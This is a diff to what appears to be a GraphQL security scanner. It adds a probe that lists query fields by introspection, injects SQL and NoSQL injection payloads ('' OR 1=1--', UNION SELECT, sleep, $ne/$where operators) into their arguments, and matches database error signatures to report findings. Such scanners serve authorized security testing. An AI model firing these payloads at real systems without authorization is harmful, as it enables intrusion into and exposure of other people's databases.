@@ -829,6 +829,84 @@ class GraphQLPersistedQueryBypassProber(BaseScanner):
                 logger.warning(f"[GraphQL-Persisted] Legacy ID format accepted at {url}")
 
 
+# --- GraphQL Argument Injection Probe (SQLi / NoSQLi through GraphQL arguments) ---
+class GraphQLInjectionProbe:
+    """
+    GraphQL argument injection — query argümanlarına SQLi/NoSQLi/SSTI payload enjekte et.
+    Introspection'dan field listesi alınır, her field'a payload gönderilir.
+    """
+
+    _SQL_PAYLOADS = ["' OR 1=1--", "1 OR 1=1", "' UNION SELECT 1,2,3--", "';SELECT sleep(3);--"]
+    _NOSQL_PAYLOADS = ['{"$gt":""}', '{"$ne":null}', '{"$where":"1==1"}']
+    _ERROR_SIGS = [
+        r"SQL syntax", r"ORA-\d+", r"pg_query", r"mysql_fetch",
+        r"Uncaught.*Error", r"operator does not exist",
+        r"MongoError", r"BSONTypeError", r"SyntaxError.*\$",
+    ]
+
+    def run(self, client: "GraphQLClient", url: str) -> "List[Finding]":  # type: ignore[name-defined]
+        import re, json
+
+        findings: list = []
+
+        # Discover queryable fields via introspection
+        schema_query = {"query": "{ __schema { queryType { fields { name args { name type { name kind } } } } } }"}
+        _, schema_j, _, _ = client.post(url, schema_query)
+        fields = []
+        try:
+            qt = (schema_j.get("data") or {}).get("__schema", {}).get("queryType") or {}
+            fields = (qt.get("fields") or [])[:10]
+        except Exception:
+            fields = []
+
+        if not fields:
+            # Fallback: probe with generic field names
+            fields = [{"name": "user", "args": [{"name": "id", "type": {"name": "String", "kind": "SCALAR"}}]},
+                      {"name": "product", "args": [{"name": "id", "type": {"name": "String", "kind": "SCALAR"}}]}]
+
+        all_payloads = self._SQL_PAYLOADS + self._NOSQL_PAYLOADS
+
+        for field in fields:
+            fname = field.get("name", "")
+            args = field.get("args") or []
+            if not args:
+                continue
+            arg_name = args[0].get("name", "id")
+
+            for payload in all_payloads:
+                gql_query = {"query": f'{{ {fname}({arg_name}: "{payload}") {{ id }} }}'}
+                code, resp_j, raw, dt = client.post(url, gql_query)
+                text = raw or json.dumps(resp_j or {})
+
+                for sig in self._ERROR_SIGS:
+                    if re.search(sig, text, re.IGNORECASE):
+                        findings.append(Finding(
+                            endpoint=url,
+                            issue=f"GraphQL Argument Injection ({fname}.{arg_name})",
+                            severity="High",
+                            payload=gql_query,
+                            status=code,
+                            latency=dt,
+                            body_hint=f"Error signature: {sig} — {text[:200]}",
+                        ))
+                        return findings  # Stop on first confirmed
+
+                # NoSQL: successful response with injected operator
+                if code == 200 and resp_j.get("data") and "$" in payload:
+                    findings.append(Finding(
+                        endpoint=url,
+                        issue=f"GraphQL NoSQL Injection ({fname}.{arg_name})",
+                        severity="High",
+                        payload=gql_query,
+                        status=code,
+                        latency=dt,
+                        body_hint=f"Server returned data for NoSQL operator payload: {payload!r}",
+                    ))
+                    return findings
+
+        return findings
+
+
 # --- Main Scanner Class ---
 class GraphQLScanner(BaseScanner):
     name = "graphql"
@@ -859,6 +937,7 @@ class GraphQLScanner(BaseScanner):
             DepthAbuseProbe(),
             DirectiveInjectionProbe(),
             InfoDisclosureProbe(),
+            GraphQLInjectionProbe(),
         ]
 
         for ep in endpoints:
